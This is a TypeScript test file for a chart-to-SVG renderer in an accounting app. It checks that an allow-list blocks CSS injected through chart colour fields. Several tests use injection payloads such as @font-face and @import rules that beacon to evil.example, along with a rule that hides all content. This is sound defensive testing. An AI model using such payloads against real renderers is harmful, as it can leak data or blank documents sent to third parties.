/**
 * The `<style>` block zrender emits with every chart, and why it is
 * allow-listed rather than scanned for forbidden patterns.
 *
 * zrender interpolates `emphasis.itemStyle.color` (and `borderColor`) into
 * that CSS UNESCAPED, and the block is inside `<![CDATA[ … ]]>`, so it is not
 * text content and survives the markup checks in ssrSvg.ts — none of which
 * look for CSS. An inline `<svg>`'s stylesheet is DOCUMENT-scoped, so an
 * injected `@font-face` plus a `text { font-family: … }` rule makes Chromium
 * fetch a font while rendering the pack (the outbound fetch the guard exists
 * to prevent), and an injected `* { display:none }` blanks a document going
 * to a bank without touching the network at all.
 *
 * This branch has now been bitten three times by "match a forbidden pattern
 * anywhere" — the id rewrite, the absolute-URL scan, and the two positional
 * checks fixed with it. So the rule here is the opposite: the CDATA must
 * consist ONLY of the `.zr<hash>-<n>:hover { … }` rules zrender itself writes,
 * and anything else is an injection by definition.
 */
import { describe, expect, it } from 'vitest';
import { CHART_HEIGHT_MM, renderChartSvg } from '@/lib/charts/ssrSvg';
import { buildWaterfallOption } from '@/components/accounting/charts/waterfallOption';
import { buildBudgetBulletOption } from '@/components/accounting/charts/bulletOption';
import { buildCashFlowSankeyOption, type CashFlowReport } from '@/components/accounting/charts/sankeyOption';
import { buildCashPositionOption } from '@/components/accounting/charts/cashPositionOption';
import { buildSmallMultiplesOption } from '@/components/accounting/charts/smallMultiplesOption';
import { buildBudgetVsActualLines } from '@/modules/accounting/services/reports/budgetVsActualLines';
import { DEFAULT_PALETTE } from '@/components/accounting/charts/chartTypes';
import type { WaterfallStep } from '@/modules/accounting/services/reports/waterfallDataService';

const SIZE = { widthMm: 170, heightMm: CHART_HEIGHT_MM.half };

/** A bar chart carrying an injected emphasis colour, the shape ECharts pipes
 *  straight into the style block. */
const withEmphasis = (colour: string) => ({
  xAxis: { type: 'category', data: ['a', 'b'] },
  yAxis: { type: 'value' },
  series: [{ type: 'bar', data: [{ value: 1, emphasis: { itemStyle: { color: colour } } }, 2] }],
});

describe('the <style> CDATA is allow-listed', () => {
  it('refuses an injected @font-face — a document-scoped stylesheet that fetches', () => {
    const payload =
      '#f00; } @font-face { font-family:EV; src:url(https://evil.example/beacon.woff); }' +
      ' text { font-family:EV; } .z:hover { fill:#000';
    expect(() => renderChartSvg(withEmphasis(payload), SIZE)).toThrow(/style/i);
  });

  it('refuses an injected rule that blanks the pack, with no network involved', () => {
    const payload = '#f00; } * { display:none !important; } .z:hover { fill:#000';
    expect(() => renderChartSvg(withEmphasis(payload), SIZE)).toThrow(/style/i);
  });

  it('refuses an @import, which sits BETWEEN rules rather than inside one', () => {
    // The allow-list has to reject what is outside a rule as well as what is
    // inside one — an at-rule needs no braces to fetch.
    const payload = '#f00; } @import url(https://evil.example/x.css); .z:hover { fill:#000';
    expect(() => renderChartSvg(withEmphasis(payload), SIZE)).toThrow(/style/i);
  });

  it('refuses the same injection through a series-level borderColor', () => {
    const hostile = {
      xAxis: { type: 'category', data: ['a', 'b'] },
      yAxis: { type: 'value' },
      series: [{
        type: 'bar', data: [1, 2],
        emphasis: { itemStyle: { borderColor: 'red; } @font-face { src:url(https://evil.example/x.woff) } .q:hover { fill:#000' } },
      }],
    };
    expect(() => renderChartSvg(hostile, SIZE)).toThrow(/style/i);
  });
});

/**
 * zrender stringifies a gradient object into the hover rule as
 * `fill:[object Object]`, and `[`/`]` are in no CSS-value charset worth
 * writing. A gradient area fill is idiomatic for exactly the trend charts the
 * next workstream builds, and sankey link gradients are a documented ECharts
 * setting on a chart type this repo registers — so an allow-list that refuses
 * them would fire on legitimate data with a message pointing nowhere near the
 * gradient.
 */
describe('the allow-list admits a gradient', () => {
  const GRADIENT = {
    type: 'linear', x: 0, y: 0, x2: 0, y2: 1,
    colorStops: [{ offset: 0, color: '#587bf3' }, { offset: 1, color: '#ffffff' }],
  };
  const AXES = { xAxis: { type: 'category', data: ['a', 'b'] }, yAxis: { type: 'value' } };

  const CASES: Array<[string, unknown]> = [
    ['line with a gradient areaStyle',
      { ...AXES, series: [{ type: 'line', data: [1, 2], areaStyle: { color: GRADIENT } }] }],
    ['bar with a gradient itemStyle',
      { ...AXES, series: [{ type: 'bar', data: [1, 2], itemStyle: { color: GRADIENT } }] }],
    ['bar with a gradient emphasis',
      { ...AXES, series: [{ type: 'bar', data: [1, 2], emphasis: { itemStyle: { color: GRADIENT } } }] }],
    ['sankey with gradient links', {
      series: [{
        type: 'sankey',
        data: [{ name: 'Opening' }, { name: 'Cash' }, { name: 'Closing' }],
        links: [
          { source: 'Opening', target: 'Cash', value: 5 },
          { source: 'Cash', target: 'Closing', value: 3 },
        ],
        lineStyle: { color: 'gradient' },
      }],
    }],
  ];

  for (const [name, option] of CASES) {
    it(`renders a ${name}`, () => {
      expect(() => renderChartSvg(option, SIZE)).not.toThrow();
    });
  }

  it('admits the literal only as a whole value, not as a prefix to smuggle behind', () => {
    // The exception is one exact string, not a licence for brackets.
    expect(() => renderChartSvg(withEmphasis('[object Object] } * { display:none'), SIZE))
      .toThrow(/style/i);
    expect(() => renderChartSvg(withEmphasis('[object Object] url(https://evil.example/x)'), SIZE))
      .toThrow(/style/i);
  });

  it('names what it saw, so whoever hits it does not look in the wrong place', () => {
    expect(() => renderChartSvg(withEmphasis('#f00; } * { display:none } .z:hover { fill:#000'), SIZE))
      .toThrow(/unexpected selector: "\*"/);
  });
});

/**
 * The allow-list is only worth having if it admits everything this repo
 * actually draws. Every builder in src/components/accounting/charts is
 * rendered here, plus a plain bar and line.
 *
 * A plain PIE is deliberately absent: PieChart is not registered in
 * src/lib/charts/echarts.ts, so this path cannot draw one at all — it renders
 * an empty canvas with no style block. Registering it is a separate decision.
 */
describe('every chart this repo draws still renders', () => {
  const STEPS: WaterfallStep[] = [
    { label: 'Revenue', start: 0, end: 1_000_000, value: 1_000_000, isSubtotal: false, color: 'green' },
    { label: 'Cost of sales', start: 1_000_000, end: -400_000, value: -1_400_000, isSubtotal: false, color: 'red' },
    { label: 'Net loss', start: 0, end: -600_000, value: -600_000, isSubtotal: true, color: 'blue' },
  ];
  const LINES = buildBudgetVsActualLines(
    [
      { id: 'a', account_code: '1000', account_name: 'Sales', account_type: 'revenue', actual_amount: 900_000 },
      { id: 'b', account_code: '6000', account_name: 'Rent', account_type: 'expense', actual_amount: 130_000 },
    ],
    { '1000': 1_000_000, '6000': 120_000 },
  );
  const REPORT: CashFlowReport = {
    period_start: '2026-01-01', period_end: '2026-08-31', opening_cash: 200_000,
    sections: [{
      section: 'Operating Activities', total: 130_000,
      items: [{ label: 'Net Income', amount: 180_000 }, { label: 'Change in AR', amount: -70_000 }],
    }],
    net_change: 80_000, closing_cash: 280_000,
  };

  const CHARTS: Array<[string, unknown]> = [
    ['waterfall', buildWaterfallOption(STEPS, DEFAULT_PALETTE)],
    ['budget bullets', buildBudgetBulletOption(LINES, DEFAULT_PALETTE)],
    ['cash flow sankey', buildCashFlowSankeyOption(REPORT, DEFAULT_PALETTE)],
    ['cash position', buildCashPositionOption(
      [{ name: 'Cash', value: 480_000 }, { name: 'AP', value: -690_000 }], DEFAULT_PALETTE)],
    ['small multiples', buildSmallMultiplesOption(
      [{ key: '1000', label: 'Sales', values: [100, 120, 90] },
       { key: '6000', label: 'Rent', values: [12, 12, 12] }],
      ['2026-01', '2026-02', '2026-03'], DEFAULT_PALETTE, { columns: 2 })],
    ['plain bar', { xAxis: { type: 'category', data: ['a', 'b'] }, yAxis: { type: 'value' },
      series: [{ type: 'bar', data: [1, 2] }] }],
    ['plain line', { xAxis: { type: 'category', data: ['a', 'b'] }, yAxis: { type: 'value' },
      series: [{ type: 'line', data: [1, 2] }] }],
  ];

  for (const [name, option] of CHARTS) {
    it(`${name} renders at every pack height and emits only hover rules`, () => {
      for (const heightMm of Object.values(CHART_HEIGHT_MM)) {
        const svg = renderChartSvg(option, { widthMm: 170, heightMm });
        expect(svg).toMatch(/^<svg[\s>]/);
        for (const block of svg.matchAll(/<style\b[^>]*>([\s\S]*?)<\/style>/g)) {
          const css = (block[1] ?? '').replace(/<!\[CDATA\[/, '').replace(/\]\]>/, '');
          // Every selector in what we emit is a generated hover class.
          for (const rule of css.matchAll(/([^{}]*)\{[^{}]*\}/g)) {
            expect(rule[1]!.trim(), `${name} emitted an unexpected selector`)
              .toMatch(/^\.zr[0-9a-z]+-\d+:hover$/);
          }
        }
      }
    });
  }
});
